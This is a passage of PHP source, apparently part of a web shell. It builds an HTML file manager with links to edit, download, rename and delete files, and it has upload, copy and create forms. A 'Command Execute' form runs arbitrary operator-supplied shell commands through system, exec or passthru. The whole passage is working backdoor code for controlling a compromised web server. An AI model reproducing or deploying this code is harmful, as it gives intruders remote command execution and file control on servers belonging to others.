$fil=$fil.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="1" dir="ltr">
<tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><img src="data:image/png;base64,' .$picdir. '" /> <a href="?address='.$cwd.$slash.$fileee.$slash.'">'.$fileee.'</b></span></td>
<td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt">'.substr(sprintf('%o', fileperms($cwd.$slash."$fileee")), -3).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="Tahoma" style="font-size: 9pt"><a href="?do=down&type=dir&address='.$cwd.$slash.'&dirname='.$fileee.'">DL</a></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=rename&address='.$cwd.$slash.'&filename='.$fileee.'">Ren</a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=delete&type=dir&address='.$cwd.$slash.'&filename='.$fileee.'">Del</a></td></tr></table>'
;}
else{

		if ($coi2 %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';
}

$coi2++;
$file=$file.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><img src="data:image/png;base64,' .$picfile. '" /> '.openf($fileee).'</span></td>
<td valign="top" height="19" width="80"><font face="Tahoma" style="font-size: 9pt">'.sizee(filesize($fileee)).'</td><td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt">'.substr(sprintf('%o', fileperms($cwd.$slash."$fileee")), -3).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=edit&address='.$cwd.$slash.'&filename='.$fileee.'">Edit</a></td><td valign="top" height="19" width="23"><font face="Tahoma" style="font-size: 9pt"><a href="?do=down&type=file&address='.$cwd.$slash.'&filename='.$fileee.'">DL</a></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=rename&address='.$cwd.$slash.'&filename='.$fileee.'">Ren</a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?do=delete&type=file&address='.$cwd.$slash.'&filename='.$fileee.'">Del</a></td></tr></table>'
;}
}
}
echo $head.'
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#000000>Back</span></td>
</tr></table>'.$fil.$file.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5">
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Command Execute : </font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input type=hidden name=address value='.getcwd().'><input name=command value=id size=50><input type=hidden name=do value=cmd size=50> <select name=execmethod>
  <option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option>
</select> <input type=submit value="Execute"></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Change Dir : </font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input name=address value='.getcwd().$slash.' size=50>
<input type=submit value=Change></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Create Dir : </font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input name=cdirname value='.getcwd().$slash.' size=50><input type=hidden name=address value='.getcwd().'><input type=submit value="  Create  "></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Create File : </font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input name=cfilename value='.getcwd().$slash.' size=50> <input type=hidden name=address value='.getcwd().'><input type=submit value="  Create  "></form></td></tr>
<tr></form>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Upload : </font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><form action="'.$me.'" method=post enctype=multipart/form-data>'.$nowaddress.'
<font face="Tahoma" style="font-size: 10pt"><input size=40 type=file name=filee > <input type=hidden name=address value='.getcwd().'>
<input type=submit value=Upload /></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Copy File : </font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input size=20 name=copyname><input type=hidden name=address value="'.getcwd().'"> To <input size=40 name=cpyto value="'.getcwd().$slash.'"> <input type=submit value =Copy></form></td></tr>
'.$end;
?>
